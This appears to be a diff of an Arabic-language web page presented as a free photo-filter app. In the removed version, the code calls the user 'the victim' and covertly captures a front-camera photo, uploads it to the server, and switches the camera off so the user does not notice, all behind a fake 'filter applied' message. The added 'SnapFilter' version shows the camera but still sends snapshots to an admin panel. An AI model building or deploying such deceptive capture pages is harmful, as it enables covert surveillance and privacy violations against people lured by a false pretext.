@@ -3,93 +3,111 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>منصة تعديل الصور والفلاتر المجانية</title>
+    <title>تطبيق SnapFilter</title>
     <style>
-        body { 
-            font-family: Tahoma, sans-serif; 
-            text-align: center; 
-            background: #f4f4f9; 
-            padding-top: 80px; 
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background: #111;
+            color: #fff;
+            margin: 0;
+            padding: 20px;
         }
-        .box { 
-            background: white; 
-            padding: 40px; 
-            border-radius: 12px; 
-            display: inline-block; 
-            box-shadow: 0px 4px 15px rgba(0,0,0,0.1); 
+        h2 { color: #ff4757; }
+        video, canvas {
+            width: 100%;
             max-width: 400px;
+            border-radius: 10px;
+            border: 2px solid #444;
+            margin-bottom: 10px;
         }
-        h2 { color: #333; margin-bottom: 10px; }
-        p { color: #666; font-size: 14px; margin-bottom: 25px; }
-        button { 
-            background: #ff4757; 
-            color: white; 
-            border: none; 
-            padding: 12px 30px; 
-            font-size: 16px; 
-            border-radius: 6px; 
-            cursor: pointer; 
-            transition: background 0.3s;
+        .btn {
+            background: #ff4757;
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            font-size: 18px;
+            border-radius: 8px;
+            cursor: pointer;
+            margin-top: 10px;
         }
-        button:hover { background: #ff6b81; }
-        #video { display: none; }
+        .btn:active { background: #ff6b81; }
+        #status { margin-top: 15px; font-size: 16px; color: #2ed573; }
     </style>
 </head>
 <body>
 
-    <div class="box">
-        <h2>أهلاً بك في منصة الفلاتر الذكية</h2>
-        <p>اضغط على الزر أدناه لتفعيل الفلتر الذكي وعرض صورتك الشخصية على التصميم:</p>
-        <button onclick="startCapture()">تفعيل الفلتر الآن</button>
+    <h2>SnapFilter - كاميرا الفلتر</h2>
+    
+    <!-- عرض الكاميرا الحية -->
+    <div>
+        <video id="video" autoplay playsinline></video>
     </div>
 
-    <!-- عناصر خفية لتشغيل الكاميرا والرسم -->
-    <video id="video" autoplay playsinline></video>
+    <!-- زر التقاط الصورة -->
+    <div>
+        <button class="btn" id="capture-btn">التقاط الصورة وإرسالها</button>
+    </div>
+
+    <p id="status"></p>
+
+    <!-- Canvas مخفي لمعالجة الصورة -->
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        async function startCapture() {
-            try {
-                // طلب إذن الكاميرا الأمامية من الضحية
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                const video = document.getElementById('video');
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const captureBtn = document.getElementById('capture-btn');
+        const statusText = document.getElementById('status');
+
+        // فتح كاميرا الموبايل الأمامية أو الخلفية
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
+            .then(stream => {
                 video.srcObject = stream;
+            })
+            .catch(err => {
+                console.error("خطأ في تشغيل الكاميرا: ", err);
+                statusText.innerText = "تعذر الوصول إلى الكاميرا!";
+                statusText.style.color = "#ff4757";
+            });
 
-                // الانتظار 1.5 ثانية لضمان تركيز الكاميرا وإتاحة الفيديو
-                setTimeout(() => {
-                    const canvas = document.getElementById('canvas');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    const context = canvas.getContext('2d');
-                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        // عند الضغط على زر التقاط الصورة
+        captureBtn.addEventListener('click', () => {
+            canvas.width = video.videoWidth || 400;
+            canvas.height = video.videoHeight || 400;
+            const ctx = canvas.getContext('2d');
+            
+            // رسم لقطة من الفيديو على الـ Canvas
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                    // تحويل الصورة إلى صيغة Base64 لإرسالها
-                    const imageData = canvas.toDataURL('image/png');
+            // تحويل الصورة إلى صيغة Base64
+            const imageData = canvas.toDataURL('image/png');
 
-                    // إرسال الصورة إلى مسار الخادم (/upload)
-                    fetch('/upload', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ image: imageData })
-                    })
-                    .then(response => response.json())
-                    .then(data => {
-                        console.log('Success:', data);
-                        alert('تم تطبيق الفلتر بنجاح!');
-                    })
-                    .catch((error) => {
-                        console.error('Error:', error);
-                    });
+            statusText.innerText = "جاري إرسال الصورة إلى لوحة التحكم...";
 
-                    // إيقاف عمل الكاميرا بعد الالتقاط لتجنب لفت انتباه المستخدم (توقف اللمبة الخضراء)
-                    stream.getTracks().forEach(track => track.stop());
-                }, 1500);
-
-            } catch (err) {
-                console.error("فشل الوصول إلى الكاميرا: ", err);
-                alert("عذراً، يجب السماح للوصول إلى الكاميرا لتشغيل الفلتر.");
-            }
-        }
+            // إرسال الصورة إلى السيرفر
+            fetch('/upload-snapshot', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ image: imageData })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    statusText.innerText = "تم التقاط الصورة وإرسالها بنجاح! تحقق من صفحة الـ Admin";
+                } else {
+                    statusText.innerText = "فشل في حفظ الصورة على السيرفر.";
+                    statusText.style.color = "#ff4757";
+                }
+            })
+            .catch(error => {
+                console.error('خطأ:', error);
+                statusText.innerText = "حدث خطأ أثناء الاتصال بالسيرفر.";
+                statusText.style.color = "#ff4757";
+            });
+        });
     </script>
 
 </body>
